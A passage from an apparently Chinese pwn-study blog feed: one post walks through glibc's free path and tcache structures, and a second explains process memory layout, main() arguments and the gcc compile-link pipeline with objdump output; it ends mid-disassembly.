(chunk_is_mmapped(p)) &#123;</span><br><span class="line">    munmap_chunk(p);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    mstate ar_ptr = arena_for_chunk(p);</span><br><span class="line">    _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码分成了part1/2/3三部分：</p><ul><li>part1：调用回调函数，追代码可以发现，这个回调函数为NULL</li><li>part2：允许free(0)这样的调用，即什么都不做，直接返回</li><li>part3：判断所释放的空间是不是使用mmap分配得到的，如果是mmap分配得到的，就使用munmap来释放，如果不是的话，就调用_int_free这个主释放函数来释放，后面就来重点分析这个函数</li></ul><h2 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h2><p>先贴流程</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_161840.png" alt=""></p><p>根据上图，free时先是判断chunk size是不是处在fast bin的范围，是的话就把该chunk放入fast bin中，把chunk放入fast bin的操作是一个CAS操作.</p><p>通过代码实现:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (size &lt;= get_max_fast()) &#123;</span><br><span class="line">  free_perturb(chunk2mem(p), size - CHUNK_HDR_SZ);</span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">true</span>);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);</span><br><span class="line">  fb = &amp;fastbin (av, idx);</span><br><span class="line">  <span class="comment">// Atomically link P to its fastbin: </span></span><br><span class="line">  <span class="comment">// P-&gt;FD = *FB; *FB = P;</span></span><br><span class="line">  mchunkptr old = *fb, old2;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    old2 = old;</span><br><span class="line">    p-&gt;fd = PROTECT_PTR(&amp;p-&gt;fd, old);</span><br><span class="line">  &#125; <span class="keyword">while</span> ((old = </span><br><span class="line">    catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码除了前面提到的CAS操作，还有两个点值得注意一下：</p><ul><li>使用free<em>perturb函数来改变一下所释放空间的原来内容，这个要在设置了glibc.malloc.perturb或者MALLOC_PERTURB</em>环境变量的时候才会起作用</li><li>PROTECT_PTR的底层原理实际上是一种safe-linking的安全机制，它利用了ASLR（地址空间布局随机化）中的随机性，可以很有效的防止UAF漏洞，这部分很有意思，黑客的入门题，以后有时间再专门写篇文章研究下，这里只简单提下</li></ul><p>如果chunk size不属于fast bin的范围，继续判断是不是由mmap分配产生，如果由mmap分配产生，则使用munmap_chunk这个函数来进行free，munmap_chunk的主要代码也一并列在了下面：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 如果空间是由mmap分配的，则使用munmap_chunk释放</span></span><br><span class="line"><span class="keyword">if</span> (chunk_is_mmapped(p)) &#123;</span><br><span class="line">  munmap_chunk (p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// munmap_chunk的主要实现</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">munmap_chunk</span><span class="params">(mchunkptr p)</span> &#123;</span><br><span class="line">  <span class="comment">// GLRO是一个字符串连接宏，这里把dl_pagesize</span></span><br><span class="line">  <span class="comment">// 变成了_dl_pagesize，_dl_pagesize的值是4096</span></span><br><span class="line">  <span class="type">size_t</span> pagesize = GLRO(dl_pagesize);</span><br><span class="line">  INTERNAL_SIZE_T size = chunksize (p);</span><br><span class="line"></span><br><span class="line">  <span class="type">uintptr_t</span> mem = (<span class="type">uintptr_t</span>)chunk2mem(p);</span><br><span class="line">  <span class="type">uintptr_t</span> block = (<span class="type">uintptr_t</span>)p - prev_size(p);</span><br><span class="line">  <span class="type">size_t</span> total_size = prev_size(p) + size;</span><br><span class="line">  <span class="comment">// 通过下面这个check可以发现，mmap分配的</span></span><br><span class="line">  <span class="comment">// 空间地址和大小都必须是pagesize的倍数</span></span><br><span class="line">  <span class="keyword">if</span> (((block | total_size) &amp; (pagesize - <span class="number">1</span>)) != <span class="number">0</span> ||</span><br><span class="line">      (!powerof2(mem &amp; (pagesize - <span class="number">1</span>))))</span><br><span class="line">    malloc_printerr(<span class="string">&quot;invalid pointer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  atomic_decrement(&amp;mp_.n_mmaps);</span><br><span class="line">  <span class="type">atomic_add</span>(&amp;mp_.mmapped_mem, -total_size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 继续调用__munmap来进行释放，</span></span><br><span class="line">  <span class="comment">// 追踪代码可以看到是由_vm_deallocate释放的空间</span></span><br><span class="line">  __munmap((<span class="type">char</span> *)block, total_size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个判断的原理很简单，都知道malloc的chunk header中有A、M、P 3个bit的flag，其中的M就是表示该chunk是不是由mmap系统调用产生，这个判断宏定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br></pre></td></tr></table></figure><p>如果chunk不是由mmap分配，先判断该chunk的prev chunk是不是free state，如果是的话，需要和prev chunk进行merge：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再判断next chunk是不是top chunk，是的话，重新设置top chunk：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line"><span class="keyword">if</span> (nextchunk == av-&gt;top) &#123;</span><br><span class="line">  ize += nextsize;</span><br><span class="line">  set_head(p, size | PREV_INUSE);</span><br><span class="line">  av-&gt;top = p;</span><br><span class="line">  check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果next chunk不是top chunk，有两种情况，如果是free state的话，则继续merge，如果是allocated state的话，则改变其P(PREV_INUSE) flag，最后把要free的chunk放入unsorted bin中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nextchunk = chunk_at_offset(p, size);</span><br><span class="line">nextsize = chunksize(nextchunk);</span><br><span class="line">nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">  unlink_chunk (av, nextchunk);</span><br><span class="line">  size += nextsize;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">// not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">// been given one chance to be used in malloc.</span></span><br><span class="line">bck = unsorted_chunks(av);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line">p-&gt;fd = fwd;</span><br><span class="line">p-&gt;bk = bck;</span><br><span class="line"><span class="keyword">if</span> (!in_smallbin_range(size)) &#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">bck-&gt;fd = p;</span><br><span class="line">fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">set_head(p, size | PREV_INUSE);</span><br><span class="line">set_foot(p, size);</span><br></pre></td></tr></table></figure><p>最后还要看下merge过后的chunk size是否达到FASTBIN_CONSOLIDATION_THRESHOLD这个阈值（默认大小是65536），达到的话要做一次malloc_consolidate操作（free fast bin中的chunk到unsorted bin中），对非main arena还要做一下heap_trim操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (size &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;</span><br><span class="line">  <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">  <span class="keyword">if</span> (av =!&amp;main_arena) &#123;</span><br><span class="line">    heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line">    assert(heap-&gt;ar_ptr == av);</span><br><span class="line">    heap_trim(heap, mp_.top_pad);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码中的heap_for_ptr这个宏是用来得到当前heap的heap_info的，从它的定义可以验证heap_info这个数据结构的一些特性，值得看一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr)                      \</span></span><br><span class="line"><span class="meta">  ((heap_info *)((unsigned long)(ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br></pre></td></tr></table></figure><h1 id="有tcache"><a href="#有tcache" class="headerlink" title="有tcache"></a>有tcache</h1><p>以上都是不考虑tcache的情况（libc&lt;2.26)，有tcache其实变化也并不是太大。</p><p>相关数据结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS]; <span class="comment">// TCACHE_MAX_BINS = 64</span></span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><p>tcache也是使用 类似 bins 方式来管理tcache 。</p><p><strong>tcache_perthread_struct是整个tcache</strong></p><p>每一项由 相同大小的 chunk 通过 tcache_entry 使用单向链表链接（类似于fastbin的链接方式）。</p><p><strong>counts 用于记录 entries 中每一项当前链入的 chunk 数目， 最多可以有 7 个 chunk。</strong></p><p>tcache_entry 用于链接 chunk 的结构体， 其中就只有一个 next 指针，指向下一个相同大小的 chunk.,也就说明tcache链上的成员只记录了fd指针</p><p>tcache中chunk大小范围<strong>0x20-0x410</strong></p><h2 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;  <span class="comment">// 增加到链表头部</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);  <span class="comment">// 记录当前 bin 的 chunk数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这段代码能更好地理解上面两个结构体.</p><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h3><p>用于把一个 chunk 放到 指定的 tcache-&gt;entries 里面去， tc_idx 通过 csize2tidx (nb) 计算得到 （nb是 chunk 的大小）。</p><p>它首先把 chunk+2<em>SIZE_SZ （就是除去 header 部分） 强制转换成 tcache_entry </em> 类型，e指针也就指向了mem,然后修改mem的头字段(现在被视为entery的next指针)为之前的该entery的第一个chunk,然后再把entery的值改为e指针,最后把 tcache-&gt;counts[tc_idx] 加 1 ，表示新增了一个 chunk 到 该 表项。</p><p>tcache内的chunk不写该AMP三位,chunk之间不进行合并,且放入tcache的chunk哪怕与topchunk相邻也不会进行合并</p><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h3><p>简单来说就是put的逆操作,不多说.</p><p><strong>得到tc_idx的宏定义</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span></span><br></pre></td></tr></table></figure><h2 id="基本工作"><a href="#基本工作" class="headerlink" title="基本工作"></a>基本工作</h2><ul><li>第一次 malloc 时，会先 malloc 一块内存用来存放 <strong>tcache_perthread_struct</strong> 。</li><li>单链表tcache_entry，也即tcache Bin的默认最大数量是<strong>64</strong>，在64位程序中申请的最小chunk size为32，之后以16字节依次递增，所以size大小范围是0x20-0x410，也就是说我们必须要malloc size≤0x408的chunk</li><li><p>free 内存，且 size 小于 small bin size 时</p><ul><li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）（<strong>p位不置零故不合并</strong>）</li><li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li><li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li></ul></li><li>malloc 内存，且 size 在 tcache 范围内</li><li><p>先从 tcache 取 chunk，直到 tcache 为空</p></li><li><p>tcache 为空后，从 bin 中找</p></li><li><p>tcache 为空时，如果 <strong>fastbin/smallbin/unsorted bin</strong>中有 size 符合的 chunk，会先把 <strong>fastbin/smallbin/unsorted bin</strong> 中的其他chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</p></li><li>上一条第三点详细说<ul><li>如果从 fastbin 中成功返回了一个需要的 chunk，那么对应 fastbin 中的其他 chunk 会被放进相应的 tcache bin 中，直到上限。需要注意的是 chunks 在 tcache bin 的顺序和在 fastbin 中的顺序是反过来的。</li><li>smallbin 中的情况与 fastbin 相似，双链表中的剩余 chunk 会被填充到 tcache bin 中，直到上限。</li><li>binning code（chunk合并等其他情况）中，每一个符合要求的 chunk 都会优先被放入 tcache，而不是直接返回（除非tcache被装满）。寻找结束后，tcache 会返回其中一个。</li></ul></li></ul><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>这篇文章较上一篇更多东西是缝上去的,归纳整理的成分更多,自己总结的少一点。</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础杂烩</title>
      <link href="/posts/32771/"/>
      <url>/posts/32771/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学习过程中发现自己对一些计算机系统的基础知识并不了解，目前暂时也没有精力去系统的学习，于是就将经常遇到的又不懂的知识归纳一下</p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="虚拟地址与物理地址之间的映射"><a href="#虚拟地址与物理地址之间的映射" class="headerlink" title="虚拟地址与物理地址之间的映射"></a>虚拟地址与物理地址之间的映射</h2><p>先看一下进程虚拟地址空间的总体布局，以32位Linux系统为例：</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_152459.png" alt=""></p><p>基于上图的虚拟地址空间布局来简单说下ELF文件是怎样映射到进程虚拟地址空间的，ELF文件被组织成如下图左列出的一系列section，其中具有相同属性（R/W/E）的section再组成一个segment，以segment为单位映射到进程的虚拟地址空间，其中虚拟地址空间中的segment要做到页大小对齐，下图也一同简要展示了虚拟地址空间到物理地址空间的映射，通过MMU完成。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-18_152545.png" alt=""></p><p>其它系统原理类似，都是将可执行程序组织成若干segment连同用到的动态库和kernel映射到进程的虚拟地址空间，主要差别在于不同segment映射的起始地址、大小不同等，比如32位Linux系统的Text segment起址是0x08048000，64位Linux系统的Text segment起址是0x00400000，再比如相对32位Linux系统的kernel space是1G，32位Windows的kernel space是2G等等。</p><h2 id="main函数参数"><a href="#main函数参数" class="headerlink" title="main函数参数"></a>main函数参数</h2><p>学c语言时有没有学过忘了，反正我不会，了解一下</p><ul><li><p>int argc：这个东西是所有参数的个数，包括文件名</p></li><li><p>char* argv[]：这个东西里面，argv[]是argc个参数，其中第0个参数即argv[0]是程序的全名，后面跟着的就是用户输入的参数了</p></li><li>char* envp[]：这个东西用来取得系统的环境变量，envp保存了系统所有的环境变量路径</li></ul><h2 id="从源代码到可执行文件"><a href="#从源代码到可执行文件" class="headerlink" title="从源代码到可执行文件"></a>从源代码到可执行文件</h2><p>过程可分为4个步骤：预处理（Preprocessing）、编译（Compilation）、汇编（Assembly）和链接（Linking）。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2023-03-26_110757.png" alt=""></p><p>以hello word 为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello, world\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E hello.c -o hello.i</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># <span class="number">1</span> <span class="string">&quot;hello.c&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;&lt;built-in&gt;&quot;</span></span><br><span class="line"># <span class="number">1</span> <span class="string">&quot;&lt;command-line&gt;&quot;</span></span><br><span class="line">......</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">printf</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *__restrict __format, ...)</span>;</span><br><span class="line">......</span><br><span class="line">main() &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;hello, world\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>预编译过程主要处理源代码中以 “#” 开始的预编译指令：</p><ul><li>将所有的 “#define” 删除，并且展开所有的宏定义。</li><li>处理所有条件预编译指令，如 “#if”、“#ifdef”、“#elif”、“#else”、“#endif”。</li><li>处理 “#include” 预编译指令，将被包含的文件插入到该预编译指令的位置。注意，该过程递归执行。</li><li>删除所有注释。</li><li>添加行号和文件名标号。</li><li>保留所有的 #pragma 编译器指令。</li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.c -o hello.s</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">        .file   &quot;hello.c&quot;</span><br><span class="line">        .section        .rodata</span><br><span class="line">.LC0:</span><br><span class="line">        .string &quot;hello, world&quot;</span><br><span class="line">        .text</span><br><span class="line">        .globl  main</span><br><span class="line">        .type   main, @function</span><br><span class="line">main:</span><br><span class="line">.LFB0:</span><br><span class="line">        .cfi_startproc</span><br><span class="line">        pushq   %rbp</span><br><span class="line">        .cfi_def_cfa_offset 16</span><br><span class="line">        .cfi_offset 6, -16</span><br><span class="line">        movq    %rsp, %rbp</span><br><span class="line">        .cfi_def_cfa_register 6</span><br><span class="line">        leaq    .LC0(%rip), %rdi</span><br><span class="line">        call    puts@PLT</span><br><span class="line">        movl    $0, %eax</span><br><span class="line">        popq    %rbp</span><br><span class="line">        .cfi_def_cfa 7, 8</span><br><span class="line">        ret</span><br><span class="line">        .cfi_endproc</span><br><span class="line">.LFE0:</span><br><span class="line">        .size   main, .-main</span><br><span class="line">        .ident  &quot;GCC: (GNU) 7.2.0&quot;</span><br><span class="line">        .section        .note.GNU-stack,&quot;&quot;,@progbits</span><br></pre></td></tr></table></figure><p>编译过程就是把预处理完的文件进行一系列词法分析、语法分析、语义分析及优化后生成相应的汇编代码文件。</p><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -c hello.s -o hello.o</span><br><span class="line">或者</span><br><span class="line">$gcc -c hello.c -o hello.o</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -sd hello.o</span><br><span class="line"></span><br><span class="line">hello.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">Contents of section .text:</span><br><span class="line"> 0000 554889e5 488d3d00 000000e8 00000000  UH..H.=.........</span><br><span class="line"> 0010 b8000000 005dc3                      .....].</span><br><span class="line">Contents of section .rodata:</span><br><span class="line"> 0000 68656c6c 6f2c2077 6f726c64 00        hello, world.</span><br><span class="line">Contents of section .comment:</span><br><span class="line"> 0000 00474343 3a202847 4e552920 372e322e  .GCC: (GNU) 7.2.</span><br><span class="line"> 0010 3000                                 0.</span><br><span class="line">Contents of section .eh_frame:</span><br><span class="line"> 0000 14000000 00000000 017a5200 01781001  .........zR..x..</span><br><span class="line"> 0010 1b0c0708 90010000 1c000000 1c000000  ................</span><br><span class="line"> 0020 00000000 17000000 00410e10 8602430d  .........A....C.</span><br><span class="line"> 0030 06520c07 08000000                    .R......</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;main&gt;:</span><br><span class="line">   0:   55                      push   %rbp</span><br><span class="line">   1:   48 89 e5                mov    %rsp,%rbp</span><br><span class="line">   4:   48 8d 3d 00 00 00 00    lea    0x0(%rip),%rdi        # b &lt;main+0xb&gt;</span><br><span class="line">   b:   e8 00 00 00 00          callq  10 &lt;main+0x10&gt;</span><br><span class="line">  10:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  15:   5d                      pop    %rbp</span><br><span class="line">  16:   c3                      retq</span><br></pre></td></tr></table></figure><p>汇编器将汇编代码转变成机器可以执行的指令。</p><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.o -o hello</span><br></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -d -j .text hello</span><br><span class="line">......</span><br><span class="line">000000000000064a &lt;main&gt;:</span><br><span class="line"> 64a:   55                      push   %rbp</span><br><span class="line"> 64b:   48 89 e5                mov    %rsp,%rbp</span><br><span class="line"> 64e:   48 8d 3d 9f 00 00 00    lea    0x9f(%rip),%rdi        # 6f4 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line"> 655:   e8 d6 fe ff ff          callq  530 &lt;puts@plt&gt;</span><br><span class="line"> 65a:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line"> 65f:   5d                      pop    %rbp</span><br><span class="line"> 660:   c3                      retq</span><br><span class="line"> 661:   66 2e 0f 1f 84 00 00   